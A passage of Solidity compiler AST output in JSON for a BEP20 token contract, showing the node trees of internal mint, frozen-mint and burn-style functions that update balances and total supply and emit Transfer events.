														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 105,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "1615:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 107,
														"indexExpression": {
															"argumentTypes": null,
															"id": 106,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "1625:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "1615:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 112,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "1649:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 108,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "1631:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 110,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 109,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 93,
																	"src": "1641:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "1631:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 111,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2217,
															"src": "1631:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1631:24:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1615:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "1615:40:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 118,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1687:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 117,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1679:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 119,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1679:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 120,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "1691:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 121,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 95,
															"src": "1695:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 116,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "1670:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 122,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1670:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 123,
												"nodeType": "EmitStatement",
												"src": "1665:36:0"
											}
										]
									},
									"documentation": null,
									"id": 125,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 93,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 125,
												"src": "1523:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 92,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1523:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 95,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 125,
												"src": "1535:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 94,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1535:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1522:27:0"
									},
									"returnParameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1559:0:0"
									},
									"scope": 435,
									"src": "1508:200:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 171,
										"nodeType": "Block",
										"src": "1813:377:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 139,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 135,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 127,
																"src": "1869:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 137,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1888:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 136,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1880:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 138,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1880:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "1869:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "42455032303a206d696e7420746f20746865207a65726f2061646472657373",
															"id": 140,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1892:33:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9865f573770ea57d1686e7914cb6526cbb139a36ffdd4bab8d4db350bbc932b3",
																"typeString": "literal_string \"BEP20: mint to the zero address\""
															},
															"value": "BEP20: mint to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9865f573770ea57d1686e7914cb6526cbb139a36ffdd4bab8d4db350bbc932b3",
																"typeString": "literal_string \"BEP20: mint to the zero address\""
															}
														],
														"id": 134,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "1861:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 141,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1861:65:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 142,
												"nodeType": "ExpressionStatement",
												"src": "1861:65:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 148,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 143,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "2002:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 146,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 129,
																"src": "2032:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 144,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "2016:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 145,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2217,
															"src": "2016:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 147,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2016:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2002:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 149,
												"nodeType": "ExpressionStatement",
												"src": "2002:37:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 150,
															"name": "_frozenBalance",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 33,
															"src": "2049:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 152,
														"indexExpression": {
															"argumentTypes": null,
															"id": 151,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "2064:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2049:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 157,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 129,
																"src": "2103:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 153,
																	"name": "_frozenBalance",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 33,
																	"src": "2075:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 155,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 154,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 127,
																	"src": "2090:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2075:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 156,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2217,
															"src": "2075:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 158,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2075:35:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2049:61:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 160,
												"nodeType": "ExpressionStatement",
												"src": "2049:61:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 163,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2142:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 162,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2134:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 164,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2134:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 165,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "2146:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 166,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 129,
															"src": "2155:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 161,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2125:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2125:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 168,
												"nodeType": "EmitStatement",
												"src": "2120:42:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 169,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2179:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 133,
												"id": 170,
												"nodeType": "Return",
												"src": "2172:11:0"
											}
										]
									},
									"documentation": null,
									"id": 172,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "freezeMint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 130,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 127,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1743:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 126,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1743:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 129,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1768:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 128,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1768:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1733:55:0"
									},
									"returnParameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 132,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1807:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 131,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1807:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1806:6:0"
									},
									"scope": 435,
									"src": "1714:476:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 205,
										"nodeType": "Block",
										"src": "2249:155:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 188,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 179,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2259:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 181,
														"indexExpression": {
															"argumentTypes": null,
															"id": 180,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 174,
															"src": "2269:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2259:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 186,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 176,
																"src": "2297:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 182,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2277:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 184,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 183,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 174,
																	"src": "2287:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2277:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 185,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2239,
															"src": "2277:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 187,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2277:26:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2259:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 189,
												"nodeType": "ExpressionStatement",
												"src": "2259:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 195,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 190,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "2313:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 193,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 176,
																"src": "2343:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 191,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "2327:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 192,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2239,
															"src": "2327:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 194,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2327:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2313:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 196,
												"nodeType": "ExpressionStatement",
												"src": "2313:36:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 198,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 174,
															"src": "2373:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 200,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2387:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 199,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2379:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 201,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2379:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 202,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 176,
															"src": "2391:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 197,
														"name": "Transfer",
														"nodeType": "Identifier",
